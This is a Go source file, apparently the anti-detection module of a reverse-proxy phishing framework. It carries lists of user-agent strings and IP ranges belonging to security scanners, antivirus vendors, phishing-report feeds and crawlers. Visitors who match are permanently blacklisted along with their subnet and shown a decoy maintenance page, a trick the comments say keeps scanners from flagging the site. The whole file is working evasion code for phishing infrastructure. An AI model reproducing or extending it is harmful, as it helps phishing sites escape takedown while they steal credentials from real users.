package core

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/x-tymus/x-tymus/log"
)

// knownBotUA contains substrings that identify automated scanners, threat-intel
// crawlers, security tools, and headless browsers. Matching any of these means
// the visitor is never a real user.
var knownBotUA = []string{
	// Security scanners & threat intel
	"urlscan", "censys", "shodan", "shadowserver", "securitytrails",
	"qualys", "nessus", "nikto", "masscan", "zgrab", "zmap", "nuclei",
	"virusTotal", "virustotal", "metadefender", "hybrid-analysis",
	"any.run", "anyrun", "intezer", "recordedfuture", "recorded future",
	"greynoise", "binaryedge", "onyphe", "fofa", "zoomeye", "hunterhow",
	"intrigue", "spyse", "leakix", "pulsedive", "threatminer",
	"alienvault", "otx.alienvault", "abuse.ch", "phishtank",
	"openphish", "netcraft", "fortiguard", "barracuda", "checkpoint",
	"forcepoint", "bluecoat", "symantec", "norton", "bitdefender",
	"kaspersky", "eset", "sophos", "f-secure", "avast", "avg",
	"malwarebytes", "mcafee", "trend micro", "trendmicro", "paloalto",
	"cloudflare-radar", "ipqualityscore", "ipqs", "fraudguard",
	"spur.us", "ipinfo", "ipapi", "maxmind", "db-ip",
	// Generic automation
	"python-requests", "python-urllib", "go-http-client", "java/",
	"libwww-perl", "lwp-request", "curl/", "wget/", "httpie",
	"scrapy", "aiohttp", "httpx", "pycurl", "mechanize",
	"guzzle", "faraday", "rest-client", "requests",
	// Headless browsers
	"phantomjs", "headlesschrome", "headless chrome",
	"puppeteer", "playwright", "selenium", "webdriver",
	"htmlunit", "zombie", "splash",
	// Generic bots / crawlers
	"bot", "crawler", "spider", "slurp", "fetcher", "archiver",
	"facebookexternalhit", "twitterbot", "linkedinbot", "discordbot",
	"telegrambot", "whatsapp", "applebot", "bingbot", "googlebot",
	"yandexbot", "baiduspider", "duckduckbot", "semrushbot",
	"ahrefsbot", "mj12bot", "dotbot", "rogerbot", "exabot",
	"sistrix", "blexbot", "mojeekbot", "petalbot", "bytespider",
	"claudebot", "gptbot", "perplexitybot", "anthropic-ai",
}

// knownScannerCIDRs are datacenter/hosting CIDR ranges heavily used by
// automated scanners and threat-intelligence platforms.
var knownScannerCIDRs = []string{
	// Censys
	"162.142.125.0/24",
	"167.248.133.0/24",
	// Shodan
	"198.20.69.0/24",
	"198.20.70.0/24",
	"198.20.99.0/24",
	"198.20.100.0/24",
	// urlscan.io
	"54.68.134.0/24",
	// Shadowserver
	"184.105.139.0/24",
	"184.105.143.0/24",
	"184.105.247.0/24",
	"74.82.47.0/24",
	// GreyNoise
	"104.131.0.0/16",
	// BinaryEdge
	"179.61.251.0/24",
	"185.198.134.0/24",
	// IPVoid / security scanning
	"80.82.77.0/24",
	"80.82.78.0/24",
}

var scannerNets []*net.IPNet

func init() {
	for _, cidr := range knownScannerCIDRs {
		_, n, err := net.ParseCIDR(cidr)
		if err == nil {
			scannerNets = append(scannerNets, n)
		}
	}
}

// IsKnownBot returns true if the user-agent string matches any known scanner,
// automation tool, or headless browser pattern.
func IsKnownBot(ua string) bool {
	lower := strings.ToLower(ua)
	for _, sig := range knownBotUA {
		if strings.Contains(lower, strings.ToLower(sig)) {
			return true
		}
	}
	return false
}

// IsKnownScannerIP returns true if the IP belongs to a known scanner CIDR.
func IsKnownScannerIP(ip string) bool {
	parsed := net.ParseIP(ip)
	if parsed == nil {
		return false
	}
	for _, n := range scannerNets {
		if n.Contains(parsed) {
			return true
		}
	}
	return false
}

// AddScannerCIDR permanently blocks an entire subnet in the runtime blacklist.
// Writes the CIDR to blacklist.txt so it persists across restarts.
func AddScannerCIDR(cidr string) {
	if GlobalBlacklist == nil || GlobalBlacklist.configPath == "" {
		return
	}
	_, n, err := net.ParseCIDR(cidr)
	if err != nil {
		return
	}
	// Check if already blocked
	for _, existing := range GlobalBlacklist.masks {
		if existing.mask != nil && existing.mask.String() == n.String() {
			return
		}
	}
	// Persist to file
	f, err := os.OpenFile(GlobalBlacklist.configPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Error("antibot: failed to open blacklist file: %v", err)
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s\n", cidr)

	// Add to in-memory mask list
	GlobalBlacklist.masks = append(GlobalBlacklist.masks, &BlockIP{mask: n})
	log.Warning("antibot: blocked scanner subnet %s permanently", cidr)
}

// decoyHTML is served to all unauthorized visitors — bots, scanners, and
// anyone without a valid lure token. It looks like an ordinary expired/maintenance
// page. Returning real 200 HTML means scanners cannot flag a redirect chain.
const decoyHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Temporarily Unavailable</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
       background:#f5f5f5;display:flex;align-items:center;justify-content:center;
       min-height:100vh;color:#333}
  .box{background:#fff;border-radius:8px;padding:48px 56px;max-width:480px;
       text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.08)}
  .icon{font-size:48px;margin-bottom:16px}
  h1{font-size:22px;font-weight:600;margin-bottom:12px}
  p{font-size:15px;color:#666;line-height:1.6}
  .code{margin-top:24px;font-size:12px;color:#aaa}
</style>
</head>
<body>
<div class="box">
  <div class="icon">🔧</div>
  <h1>We'll be right back</h1>
  <p>This page is temporarily unavailable due to scheduled maintenance.<br>
     Please check back in a few minutes.</p>
  <div class="code">ERR_CONNECTION_MAINTENANCE</div>
</div>
</body>
</html>`

// DecoyResponse returns a goproxy response that looks like a plain maintenance
// page. No redirect — scanners see HTTP 200 with clean HTML and move on.
func DecoyResponse(req *http.Request) (*http.Request, *http.Response) {
	resp := goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, decoyHTML)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-store")
		resp.Header.Set("X-Content-Type-Options", "nosniff")
	}
	return req, resp
}

// CheckAndBlockBot inspects the request for bot signals. If detected:
//  1. Permanently blacklists the IP.
//  2. Returns (true, DecoyResponse) so the caller can return immediately.
//
// If not a bot, returns (false, nil, nil).
func CheckAndBlockBot(req *http.Request, from_ip string, bl *Blacklist) (bool, *http.Request, *http.Response) {
	ua := req.UserAgent()
	isBot := IsKnownBot(ua) || IsKnownScannerIP(from_ip)
	if !isBot {
		return false, nil, nil
	}

	log.Warning("antibot: scanner detected UA=%q IP=%s — blacklisting permanently", ua, from_ip)
	if bl != nil {
		_ = bl.AddIP(from_ip)

		// Also block the /24 subnet to stop range scans
		if ip := net.ParseIP(from_ip); ip != nil {
			if ip4 := ip.To4(); ip4 != nil {
				cidr := fmt.Sprintf("%d.%d.%d.0/24", ip4[0], ip4[1], ip4[2])
				AddScannerCIDR(cidr)
			}
		}
	}

	rq, rs := DecoyResponse(req)
	return true, rq, rs
}
